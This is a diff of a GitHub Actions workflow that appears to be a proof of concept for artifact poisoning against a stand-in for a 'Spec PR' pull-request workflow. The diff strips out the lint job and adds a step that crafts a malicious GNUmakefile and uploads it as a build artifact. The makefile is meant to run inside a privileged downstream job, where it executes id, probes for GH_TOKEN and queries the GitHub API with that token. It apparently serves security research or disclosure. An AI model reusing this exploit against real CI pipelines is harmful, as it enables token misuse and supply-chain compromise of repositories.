@@ -1,27 +1,30 @@
 name: Spec PR
-# Stand-in for digitalocean/openapi "Spec PR" (pull_request triggered).
+# ATTACKER-CONTROLLED COPY of the "Spec PR" workflow, run from the PR head.
 on: [pull_request]
 permissions:
   contents: read
 jobs:
-  lint:
-    name: Validate spec
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Run linter
-        run: echo lint-ok
   bundle-spec:
     name: Bundle Spec
     runs-on: ubuntu-latest
-    needs: lint
     steps:
       - uses: actions/checkout@v4
-      - name: Bundle
+      - name: Craft malicious artifact content
         run: |
-          mkdir -p tests
-          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n' > tests/openapi-bundled.yaml
+          mkdir -p pydo
+          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n' > openapi-bundled.yaml
+          cat > pydo/GNUmakefile <<'MK'
+          generate:
+          	@echo "PWNED: attacker-controlled GNUmakefile executed inside workflow_run job"
+          	@id
+          	@echo "GH_TOKEN_PRESENT=$${GH_TOKEN:+yes}"
+          	@echo "SPEC_FILE=$$SPEC_FILE"
+          	@curl -s -H "Authorization: token $$GH_TOKEN" https://api.github.com/repos/$${GITHUB_REPOSITORY} | grep -A6 '"permissions"' || true
+          MK
+          echo "--- crafted pydo/GNUmakefile:"; cat -A pydo/GNUmakefile | sed -n '1,6p'
       - uses: actions/upload-artifact@v4
         with:
           name: openapi-bundled
-          path: tests/openapi-bundled.yaml
+          path: |
+            openapi-bundled.yaml
+            pydo/GNUmakefile
